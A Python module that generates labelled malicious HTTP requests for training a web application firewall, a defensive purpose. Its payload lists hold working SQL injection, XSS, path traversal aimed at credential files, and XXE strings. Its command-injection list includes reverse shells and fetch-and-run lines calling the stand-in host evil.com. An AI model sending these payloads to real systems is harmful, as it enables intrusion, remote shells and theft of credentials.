"""
Malicious Traffic Generator

Generate realistic malicious HTTP requests for WAF training
"""
import random
import json
from typing import List, Dict, Optional, Iterator
from dataclasses import dataclass
from urllib.parse import urlencode, quote, unquote
import base64
import hashlib
from loguru import logger

# Import malicious payloads directly to avoid module path issues
SQL_INJECTION_PAYLOADS = [
    "1' OR '1'='1",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' OR SLEEP(5)--",
    "1'; DROP TABLE users--",
    "1' UNION SELECT user, password FROM users--",
    "1' OR '1'='1' /*",
    "1' OR '1'='1' #",
    "1' OR '1'='1' --",
    "1' OR '1'='1' UNION SELECT NULL, NULL--",
    "1' OR '1'='1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' UNION SELECT NULL, NULL, NULL--",
    "admin' OR '1'='1",
    "' OR 'x'='x",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' OR '1'='1' LIMIT 1--",
    "1' OR '1'='1' ORDER BY 1--",
    "1' OR '1'='1' GROUP BY 1--",
    "1' OR '1'='1' HAVING 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form><input onfocus=alert('XSS')></form>",
    "<math><mtext><script>alert('XSS')</script></mtext></math>",
    "<!--<script>alert('XSS')</script>-->",
    "<![CDATA[<script>alert('XSS')</script>]]>",
    "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
    "<table background=javascript:alert('XSS')>",
    "<div style=background-image:url(javascript:alert('XSS'))>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<base href=javascript:alert('XSS')//>",
    "<object type=text/x-scriptlet data=javascript:alert('XSS')></object>",
    "<applet code=javascript:alert('XSS')></applet>",
    "<script src=data:text/javascript,alert('XSS')></script>",
    "<iframe srcdoc=<script>alert('XSS')></script>>",
    "<track src=javascript:alert('XSS')>",
    "<video poster=javascript:alert('XSS')>",
    "<img dynsrc=javascript:alert('XSS')>",
    "<img lowsrc=javascript:alert('XSS')>",
    "<img src=javascript:alert('XSS')>",
    "<img src=vbscript:msgbox('XSS')>",
    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><script href=data:,alert('XSS')></script></svg>",
    "<math href=javascript:alert('XSS')>CLICKME</math>",
    "<math><maction actiontype=statusline href=javascript:alert('XSS')>CLICKME</maction></math>",
    "<frameset onload=alert('XSS')>",
    "<applet archive=javascript:alert('XSS')></applet>",
    "<object codebase=javascript:alert('XSS')></object>",
    "<meta charset=mac-f8ff content=text/html; charset=mac-f8ff><script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "<script>alert('XSS'.charAt(0))</script>",
    "<script>alert('XSS'.substr(0,3))</script>",
    "<script>alert('XSS'.substring(0,3))</script>",
    "<script>alert('XSS'.slice(0,3))</script>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "; uname -a",
    "| ps aux",
    "; wget http://evil.com/shell.sh",
    "| curl http://evil.com/shell.sh",
    "; nc -e /bin/sh evil.com 4444",
    "`curl http://evil.com/shell.sh | bash`",
    "$(curl http://evil.com/shell.sh | bash)",
    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "| php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "| ruby -rsocket -e 'c=TCPSocket.new(\"evil.com\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "; java -jar /tmp/evil.jar",
    "| node -e \"require('http').get('http://evil.com/shell.js', (res) => { eval(res.data) })\"",
    "; powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
    "`bash -i >& /dev/tcp/evil.com/4444 0>&1`",
    "$(bash -i >& /dev/tcp/evil.com/4444 0>&1)",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../../../etc/shadow",
    "../../../etc/hosts",
    "../../../../etc/apache2/apache2.conf",
    "../../../etc/mysql/my.cnf",
    "../../../../etc/ssh/sshd_config",
    "../../../etc/httpd/conf/httpd.conf",
    "../../../../etc/nginx/nginx.conf",
    "../../../etc/php/php.ini",
    "../../../../etc/postgresql/pg_hba.conf",
    "../../../etc/redis/redis.conf",
    "../../../../etc/mongodb.conf",
    "../../../etc/crontab",
    "../../../../etc/sudoers",
    "../../../etc/group",
    "../../../../var/log/apache2/access.log",
    "../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../var/log/syslog",
    "../../../../var/www/html/index.php",
    "../../../var/www/index.html",
    "../../../../usr/local/apache2/htdocs/index.html",
    "../../../usr/share/nginx/html/index.html",
    "../../../../opt/tomcat/webapps/ROOT/index.jsp",
    "../../../opt/jboss/server/default/deploy/ROOT.war/index.html",
    "../../../../home/user/.bashrc",
    "../../../home/user/.ssh/id_rsa",
    "../../../../root/.bash_history",
    "../../../root/.ssh/authorized_keys",
]

LDAP_INJECTION_PAYLOADS = [
    "*",
    "admin*)",
    "admin*)(uid=*))(|(uid=*",
    "*)(uid=*))(|(uid=*",
    "admin*)(|(uid=*",
    "*)(|(objectClass=*",
    "admin)(|(objectClass=*",
    "*))(|(cn=*",
    "admin))(|(cn=*",
    "*)(|(userPassword=*",
    "admin)(|(userPassword=*",
    "*)(|(mail=*",
    "admin)(|(mail=*",
    "*))(|(dn=*",
    "admin))(|(dn=*",
    "*)(|(ou=*",
    "admin)(|(ou=*",
    "*))(|(dc=*",
    "admin))(|(dc=*",
    "*))(|(o=*",
    "admin))(|(o=*",
    "*))(|(st=*",
    "admin))(|(st=*",
    "*))(|(l=*",
    "admin))(|(l=*",
    "*))(|(co=*",
    "admin))(|(co=*",
    "*))(|(c=*",
    "admin))(|(c=*",
    "*))(|(postalCode=*",
    "admin))(|(postalCode=*",
    "*))(|(telephoneNumber=*",
    "admin))(|(telephoneNumber=*",
    "*))(|(facsimileTelephoneNumber=*",
    "admin))(|(facsimileTelephoneNumber=*",
    "*))(|(mobile=*",
    "admin))(|(mobile=*",
    "*))(|(pager=*",
    "admin))(|(pager=*",
    "*))(|(employeeNumber=*",
    "admin))(|(employeeNumber=*",
    "*))(|(employeeType=*",
    "admin))(|(employeeType=*",
    "*))(|(manager=*",
    "admin))(|(manager=*",
    "*))(|(departmentNumber=*",
    "admin))(|(departmentNumber=*",
    "*))(|(title=*",
    "admin))(|(title=*",
    "*))(|(initials=*",
    "admin))(|(initials=*",
    "*))(|(givenName=*",
    "admin))(|(givenName=*",
    "*))(|(sn=*",
    "admin))(|(sn=*",
    "*))(|(homePhone=*",
    "admin))(|(homePhone=*",
    "*))(|(homePostalAddress=*",
    "admin))(|(homePostalAddress=*",
    "*))(|(description=*",
    "admin))(|(description=*",
    "*))(|(jpegPhoto=*",
    "admin))(|(jpegPhoto=*",
    "*))(|(labeledURI=*",
    "admin))(|(labeledURI=*",
    "*))(|(carLicense=*",
    "admin))(|(carLicense=*",
    "*))(|(businessCategory=*",
    "admin))(|(businessCategory=*",
    "*))(|(x500uniqueIdentifier=*",
    "admin))(|(x500uniqueIdentifier=*",
]

XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://evil.com/xxe">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
%xxe;
]>
<root>
    <data>&evil;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///proc/version">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "data:text/plain,<?php phpinfo(); ?>">
]>
<root>
    <data>&xxe;</data>
</root>""",
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "jar:file:///var/log/tomcat/catalina.out">
]>
<root>
    <data>&xxe;</data>
</root>""",
]


@dataclass
class MaliciousRequest:
    """Represents a malicious HTTP request"""
    method: str
    path: str
    query_params: Dict[str, str]
    headers: Dict[str, str]
    body: Optional[str]
    attack_type: str
    attack_family: str
    severity: str
    metadata: Dict[str, any]


class MaliciousTrafficGenerator:
    """Generate comprehensive malicious HTTP traffic"""

    def __init__(self, seed: int = 42):
        random.seed(seed)
        self.request_id = 0

        # Define attack categories and their properties
        self.attack_categories = {
            'sql_injection': {
                'family': 'Injection',
                'payloads': SQL_INJECTION_PAYLOADS,
                'common_params': ['id', 'user_id', 'product_id', 'category', 'search', 'query'],
                'severity_weights': {'low': 0.3, 'medium': 0.5, 'high': 0.2}
            },
            'xss': {
                'family': 'Injection',
                'payloads': XSS_PAYLOADS,
                'common_params': ['search', 'query', 'comment', 'message', 'input', 'data'],
                'severity_weights': {'low': 0.2, 'medium': 0.6, 'high': 0.2}
            },
            'command_injection': {
                'family': 'Injection',
                'payloads': COMMAND_INJECTION_PAYLOADS,
                'common_params': ['cmd', 'command', 'exec', 'run', 'shell'],
                'severity_weights': {'low': 0.1, 'medium': 0.3, 'high': 0.6}
            },
            'path_traversal': {
                'family': 'Access Control',
                'payloads': PATH_TRAVERSAL_PAYLOADS,
                'common_params': ['file', 'path', 'filename', 'dir', 'folder'],
                'severity_weights': {'low': 0.4, 'medium': 0.4, 'high': 0.2}
            },
            'ldap_injection': {
                'family': 'Injection',
                'payloads': LDAP_INJECTION_PAYLOADS,
                'common_params': ['username', 'user', 'login', 'dn', 'filter'],
                'severity_weights': {'low': 0.3, 'medium': 0.5, 'high': 0.2}
            },
            'xxe': {
                'family': 'Injection',
                'payloads': XXE_PAYLOADS,
                'common_params': ['xml', 'data', 'input', 'content'],
                'severity_weights': {'low': 0.2, 'medium': 0.4, 'high': 0.4}
            }
        }

        # User agents commonly used in attacks
        self.attack_user_agents = [
            "sqlmap/1.6.5",
            "nikto/2.1.6",
            "dirbuster/1.0-RC1",
            "OWASP ZAP/2.12.1",
            "w3af/1.6.49",
            "nessus/8.15.1",
            "acunetix/12.0",
            "burpsuite/2022.8.5",
            "metasploit/6.2.0",
            "nmap/7.93"
        ]

        # Common attack source IPs (simulated)
        self.attack_ips = [
            "192.168.1.100", "10.0.0.50", "172.16.0.25",
            "185.220.101.1", "185.220.101.2", "185.220.101.3",  # TOR exit nodes
            "45.155.205.1", "45.155.205.2", "45.155.205.3"     # Known malicious IPs
        ]

        # Base paths for different application types
        self.base_paths = {
            'ecommerce': ['/products', '/cart', '/checkout', '/orders', '/users'],
            'cms': ['/admin', '/wp-admin', '/login', '/dashboard', '/content'],
            'api': ['/api/v1', '/api/v2', '/graphql', '/rest', '/soap'],
            'file_server': ['/files', '/download', '/upload', '/documents', '/media']
        }

        logger.info("MaliciousTrafficGenerator initialized with comprehensive attack patterns")

    def generate_request(self, attack_type: str = None) -> MaliciousRequest:
        """Generate a single malicious request"""
        self.request_id += 1

        # Select attack type if not specified
        if attack_type is None:
            attack_type = random.choice(list(self.attack_categories.keys()))

        attack_config = self.attack_categories[attack_type]

        # Select payload
        payload = random.choice(attack_config['payloads'])

        # Select target parameter
        param_name = random.choice(attack_config['common_params'])

        # Select severity
        severity = random.choices(
            ['low', 'medium', 'high'],
            weights=[attack_config['severity_weights'][s] for s in ['low', 'medium', 'high']]
        )[0]

        # Generate request components
        method = self._select_method(attack_type)
        path = self._generate_path(attack_type)
        query_params = self._generate_query_params(param_name, payload, attack_type)
        headers = self._generate_headers(attack_type)
        body = self._generate_body(attack_type, payload) if method in ['POST', 'PUT', 'PATCH'] else None

        # Generate metadata
        metadata = {
            'request_id': self.request_id,
            'timestamp': '2024-01-24T10:00:00Z',  # Would be dynamic in real implementation
            'source_ip': random.choice(self.attack_ips),
            'user_agent': random.choice(self.attack_user_agents),
            'payload_hash': hashlib.md5(payload.encode()).hexdigest()[:8],
            'detection_difficulty': random.uniform(0.1, 1.0),
            'evasion_techniques': self._generate_evasion_techniques()
        }

        return MaliciousRequest(
            method=method,
            path=path,
            query_params=query_params,
            headers=headers,
            body=body,
            attack_type=attack_type,
            attack_family=attack_config['family'],
            severity=severity,
            metadata=metadata
        )

    def generate_batch(self, count: int, attack_distribution: Dict[str, float] = None) -> List[MaliciousRequest]:
        """Generate a batch of malicious requests"""
        requests = []

        # Default distribution if not specified
        if attack_distribution is None:
            attack_distribution = {attack: 1.0/len(self.attack_categories)
                                 for attack in self.attack_categories.keys()}

        attack_types = list(attack_distribution.keys())
        weights = list(attack_distribution.values())

        for _ in range(count):
            attack_type = random.choices(attack_types, weights=weights)[0]
            request = self.generate_request(attack_type)
            requests.append(request)

        logger.info(f"Generated {count} malicious requests")
        return requests

    def generate_temporal_sequence(self, sequence_length: int = 10) -> List[MaliciousRequest]:
        """Generate a temporal sequence of related attacks"""
        # Start with reconnaissance
        sequence = []

        # Reconnaissance phase
        for _ in range(sequence_length // 3):
            request = self.generate_request('path_traversal')
            request.metadata['phase'] = 'recon'
            sequence.append(request)

        # Exploitation phase
        for _ in range(sequence_length // 3):
            request = self.generate_request(random.choice(['sql_injection', 'command_injection']))
            request.metadata['phase'] = 'exploit'
            sequence.append(request)

        # Post-exploitation phase
        for _ in range(sequence_length - len(sequence)):
            request = self.generate_request(random.choice(['xss', 'xxe']))
            request.metadata['phase'] = 'post_exploit'
            sequence.append(request)

        # Add temporal metadata
        for i, request in enumerate(sequence):
            request.metadata['sequence_position'] = i + 1
            request.metadata['total_sequence'] = len(sequence)

        return sequence

    def _select_method(self, attack_type: str) -> str:
        """Select appropriate HTTP method for attack type"""
        method_distributions = {
            'sql_injection': ['GET', 'POST'],
            'xss': ['GET', 'POST'],
            'command_injection': ['GET', 'POST'],
            'path_traversal': ['GET'],
            'ldap_injection': ['GET', 'POST'],
            'xxe': ['POST']
        }

        methods = method_distributions.get(attack_type, ['GET'])
        return random.choice(methods)

    def _generate_path(self, attack_type: str) -> str:
        """Generate realistic path for the attack type"""
        app_type = random.choice(list(self.base_paths.keys()))
        base_path = random.choice(self.base_paths[app_type])

        # Add path variations based on attack type
        if attack_type == 'sql_injection':
            variations = ['', '/search', '/users', '/products', '/categories']
        elif attack_type == 'xss':
            variations = ['', '/search', '/comments', '/posts', '/messages']
        elif attack_type == 'command_injection':
            variations = ['', '/exec', '/run', '/cmd', '/shell']
        elif attack_type == 'path_traversal':
            variations = ['', '/files', '/download', '/documents', '/media']
        else:
            variations = ['', '/api', '/admin', '/login']

        path_suffix = random.choice(variations)
        return f"{base_path}{path_suffix}"

    def _generate_query_params(self, param_name: str, payload: str, attack_type: str) -> Dict[str, str]:
        """Generate query parameters with the malicious payload"""
        params = {}

        # Add the malicious parameter
        params[param_name] = payload

        # Add additional parameters to make it look realistic
        if attack_type in ['sql_injection', 'xss']:
            params['search'] = 'test'
            params['limit'] = str(random.randint(1, 100))
            params['offset'] = str(random.randint(0, 1000))

        elif attack_type == 'command_injection':
            params['timeout'] = str(random.randint(1, 30))

        # Add some random noise parameters
        noise_params = ['session_id', 'csrf_token', 'timestamp', 'version']
        for param in random.sample(noise_params, random.randint(0, 2)):
            if param == 'session_id':
                params[param] = ''.join(random.choices('abcdef0123456789', k=32))
            elif param == 'csrf_token':
                params[param] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
            elif param == 'timestamp':
                params[param] = str(random.randint(1600000000, 1700000000))
            elif param == 'version':
                params[param] = f"v{random.randint(1, 5)}.{random.randint(0, 9)}"

        return params

    def _generate_headers(self, attack_type: str) -> Dict[str, str]:
        """Generate HTTP headers for the malicious request"""
        headers = {}

        # Basic headers
        headers['User-Agent'] = random.choice(self.attack_user_agents)
        headers['Accept'] = '*/*'
        headers['Accept-Language'] = 'en-US,en;q=0.9'

        # Add attack-specific headers
        if attack_type == 'xxe':
            headers['Content-Type'] = 'application/xml'
        elif random.random() < 0.3:  # 30% chance of having content-type
            content_types = [
                'application/x-www-form-urlencoded',
                'application/json',
                'multipart/form-data',
                'text/plain'
            ]
            headers['Content-Type'] = random.choice(content_types)

        # Add referrer sometimes
        if random.random() < 0.4:
            referrers = [
                'https://google.com/search?q=vulnerability',
                'https://github.com/search?q=exploit',
                'https://exploit-db.com/',
                'http://localhost:3000/admin'
            ]
            headers['Referer'] = random.choice(referrers)

        # Add custom headers sometimes
        if random.random() < 0.2:
            custom_headers = [
                'X-Requested-With: XMLHttpRequest',
                'X-Forwarded-For: 127.0.0.1',
                'X-Real-IP: 10.0.0.1',
                'X-Client-IP: 192.168.1.1'
            ]
            header_name, header_value = random.choice(custom_headers).split(': ', 1)
            headers[header_name] = header_value

        return headers

    def _generate_body(self, attack_type: str, payload: str) -> Optional[str]:
        """Generate request body for POST/PUT requests"""
        if random.random() < 0.7:  # 70% chance of having a body
            return None

        if attack_type == 'xxe':
            # XML body for XXE attacks
            return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>{payload}</data>
    <xxe>&xxe;</xxe>
</root>"""

        elif attack_type in ['sql_injection', 'command_injection']:
            # Form data
            body_params = {
                'input': payload,
                'query': 'SELECT * FROM users',
                'command': payload,
                'data': json.dumps({'payload': payload})
            }
            return urlencode(body_params)

        elif attack_type == 'xss':
            # JSON body
            return json.dumps({
                'comment': payload,
                'message': f"User input: {payload}",
                'data': {'content': payload}
            })

        else:
            # Generic JSON body
            return json.dumps({
                'data': payload,
                'id': random.randint(1, 1000),
                'timestamp': '2024-01-24T10:00:00Z'
            })

    def _generate_evasion_techniques(self) -> List[str]:
        """Generate list of evasion techniques used in the request"""
        techniques = [
            'base64_encoding',
            'url_encoding',
            'case_variation',
            'comment_injection',
            'whitespace_obfuscation',
            'null_bytes',
            'concatenation'
        ]

        # Randomly select 0-3 evasion techniques
        num_techniques = random.randint(0, 3)
        return random.sample(techniques, num_techniques) if num_techniques > 0 else []

    def save_requests(self, requests: List[MaliciousRequest], filepath: str):
        """Save malicious requests to JSON file"""
        data = []
        for req in requests:
            request_dict = {
                'method': req.method,
                'path': req.path,
                'query_params': req.query_params,
                'headers': req.headers,
                'body': req.body,
                'attack_type': req.attack_type,
                'attack_family': req.attack_family,
                'severity': req.severity,
                'metadata': req.metadata,
                'label': 1  # 1 = malicious
            }
            data.append(request_dict)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        logger.info(f"Saved {len(requests)} malicious requests to {filepath}")

    def load_requests(self, filepath: str) -> List[MaliciousRequest]:
        """Load malicious requests from JSON file"""
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)

        requests = []
        for item in data:
            request = MaliciousRequest(
                method=item['method'],
                path=item['path'],
                query_params=item['query_params'],
                headers=item['headers'],
                body=item['body'],
                attack_type=item['attack_type'],
                attack_family=item['attack_family'],
                severity=item['severity'],
                metadata=item['metadata']
            )
            requests.append(request)

        logger.info(f"Loaded {len(requests)} malicious requests from {filepath}")
        return requests